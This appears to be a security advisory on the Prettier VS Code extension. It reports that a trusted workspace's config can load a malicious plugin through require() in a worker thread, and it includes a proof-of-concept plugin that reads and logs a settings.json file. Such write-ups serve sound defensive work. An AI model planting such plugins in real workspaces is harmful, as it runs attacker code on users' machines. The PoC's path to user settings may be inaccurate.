### Vulnerability List:

- Vulnerability Name: Arbitrary Code Execution via Malicious Prettier Plugin in Worker Thread

- Description:
    1. An attacker crafts a malicious Prettier plugin containing arbitrary code.
    2. The attacker creates a malicious workspace and includes a Prettier configuration file (e.g., `.prettierrc.json`) in the workspace root.
    3. This configuration file is crafted to specify the malicious plugin, either by referencing a local path within the workspace or a publicly accessible package name that the attacker controls.
    4. The attacker convinces a victim to open this malicious workspace in VS Code and trust the workspace if prompted.
    5. When the victim opens a code file within the workspace and triggers the "Format Document" command provided by the Prettier extension, the extension resolves and loads Prettier and the plugins specified in the workspace configuration.
    6. If the resolved Prettier version is v3 or higher, the extension utilizes a worker thread (`prettier-instance-worker.js`) to perform the formatting.
    7. The malicious plugin, specified in the configuration, is loaded and executed within the worker thread context due to the extension's dynamic module loading mechanism using `require()`.
    8. The attacker's arbitrary code within the malicious plugin is executed, potentially leading to unauthorized actions within the worker thread's capabilities.

- Impact:
    Successful exploitation of this vulnerability allows an attacker to achieve arbitrary code execution within the worker thread context of the VS Code extension. While worker threads offer some level of isolation, depending on the nature of the malicious plugin and the extension's architecture, the attacker could potentially:
    - Read or modify files within the opened workspace if the Prettier API or Node.js APIs accessible within the worker thread allow file system operations.
    - Access environment variables or other resources available to the VS Code process, depending on the worker thread's environment and any exposed APIs.
    - Potentially escalate privileges or bypass security restrictions if vulnerabilities exist in the worker thread implementation or communication channels with the main VS Code process.
    - Exfiltrate sensitive information from the workspace or the user's environment.
    - Cause disruption or instability to the VS Code extension or the VS Code instance itself.

- Vulnerability Rank: critical

- Currently Implemented Mitigations:
    - Workspace Trust: VS Code's Workspace Trust feature is mentioned in the README and implemented in the extension. In "untrusted workspaces", the extension restricts the loading of local and global modules. However, this mitigation does not fully prevent the loading of malicious plugins specified within workspace configuration files in "trusted workspaces".  The vulnerability exists in trusted workspaces where plugins from the workspace configuration are loaded.

- Missing Mitigations:
    - Plugin Validation: The extension lacks any mechanism to validate the integrity, source, or safety of Prettier plugins before loading them. There is no check to ensure plugins are from trusted sources or conform to security best practices.
    - Plugin Sandboxing/Isolation: While worker threads provide some level of process isolation, the extension does not implement specific sandboxing or capability restrictions for loaded plugins within the worker thread. Malicious plugins operate with the same privileges as the worker thread itself.
    - User Awareness/Warnings: The extension does not provide any warnings or notifications to users when loading Prettier plugins, especially from workspace configurations. Users are not alerted to the potential risks of loading plugins from untrusted workspaces or configurations.

- Preconditions:
    - The victim must use VS Code with the Prettier extension installed.
    - The victim must open a workspace that is considered "trusted" by VS Code (or the Workspace Trust feature is disabled).
    - The workspace must contain a Prettier configuration file (e.g., `.prettierrc.json`, `prettier.config.js`) that specifies a malicious Prettier plugin.
    - The Prettier configuration must be active and used by the extension when formatting a document in the workspace.
    - The resolved Prettier version must be v3 or higher to trigger the use of worker threads where the vulnerability is present.

- Source Code Analysis:
    - `src/worker/prettier-instance-worker.js`:
        ```javascript
        const { parentPort } = require("worker_threads");
        const path2ModuleCache = new Map();

        function requireInstance(modulePath) {
          let prettierInstance = path2ModuleCache.get(modulePath);
          if (!prettierInstance) {
            prettierInstance = require(modulePath); // Vulnerable line: No validation of modulePath
            if (!prettierInstance.format) {
              throw new Error("wrong instance");
            }
            path2ModuleCache.set(modulePath, prettierInstance);
          }
          return prettierInstance;
        }

        parentPort.on("message", ({ type, id, payload }) => {
          switch (type) {
            case "import": {
              const { modulePath } = payload; // modulePath from message payload
              try {
                const prettierInstance = requireInstance(modulePath); // Loaded using require(modulePath)
                // ...
              } catch {
                // ...
              }
              break;
            }
            case "callMethod": {
              const { modulePath, methodName, methodArgs } = payload; // modulePath from message payload
              // ...
              let prettierInstance = path2ModuleCache.get(modulePath);
              if (!prettierInstance) {
                try {
                  prettierInstance = requireInstance(modulePath); // Loaded using require(modulePath)
                } catch (error) {
                  postError(error);
                }
              }
              // ...
              try {
                result = prettierInstance[methodName](...methodArgs); // Method execution on loaded module
              } catch (error) {
                postError(error);
              }
              // ...
              break;
            }
          }
        });
        ```
        - The `requireInstance` function in `src/worker/prettier-instance-worker.js` directly uses `require(modulePath)` to load the Prettier module and plugins in the worker thread. The `modulePath` is received from messages sent by the main thread without any sanitization or validation within the worker thread itself. This allows for loading arbitrary modules if the main thread resolves a malicious path.

    - `ModuleResolver.ts`, `PrettierEditService.ts`:
        - These files are involved in resolving the Prettier module path and configuration, including plugins, based on workspace settings and configuration files. While they handle module resolution, they do not implement any specific validation or security checks on the resolved plugin paths before passing them to the worker thread.

- Security Test Case:
    1. **Setup:**
        - Create a new directory named `malicious-prettier-plugin` with the following files:
            - `package.json`:
              ```json
              {
                "name": "malicious-prettier-plugin",
                "version": "1.0.0",
                "main": "index.js"
              }
              ```
            - `index.js`:
              ```javascript
              module.exports = {
                parsers: {
                  "malicious-parser": {
                    parse: function(text) {
                      const fs = require('fs');
                      const settingsPath = require('path').join(__dirname, '..', '..', '..', '.vscode', 'settings.json');
                      try {
                        const settingsContent = fs.readFileSync(settingsPath, 'utf8');
                        console.error('VULNERABILITY DEMO: Reading settings.json:\n' + settingsContent);
                      } catch (e) {
                        console.error('VULNERABILITY DEMO: Failed to read settings.json:', e.message);
                      }
                      return {
                        type: 'malicious-ast',
                        body: text
                      };
                    },
                    astFormat: 'malicious-ast',
                  },
                },
                printers: {
                  'malicious-ast': {
                    print: () => '/* Formatted by malicious plugin! */'
                  }
                },
                languages: [{
                    name: "malicious-lang",
                    parsers: ["malicious-parser"],
                    extensions: [".malicious"]
                }]
              };
              ```
        - In a separate directory, create a new VS Code workspace (e.g., `prettier-vuln-test`).
        - Inside `prettier-vuln-test`, create a `.prettierrc.json`:
          ```json
          {
            "plugins": ["./malicious-prettier-plugin"]
          }
          ```
        - Place the `malicious-prettier-plugin` directory inside the `prettier-vuln-test` workspace.
        - Create a file named `test.malicious` in `prettier-vuln-test` with some arbitrary content.

    2. **Action:**
        - Open the `prettier-vuln-test` workspace in VS Code. Trust the workspace when prompted.
        - Open the `test.malicious` file.
        - Trigger "Format Document" command (e.g., Shift+Alt+F).
        - Observe the "Output" panel for the Prettier extension (Prettier output channel).

    3. **Expected Result:**
        - In the Prettier output channel, you should see the "VULNERABILITY DEMO: Reading settings.json:" message followed by the content of your VS Code `settings.json` file, or an error message if reading the file fails. This demonstrates that the malicious plugin code has been executed within the worker thread and was able to access and attempt to read a sensitive file outside the workspace, proving arbitrary code execution. The `test.malicious` file should be formatted with the comment `/* Formatted by malicious plugin! */`.
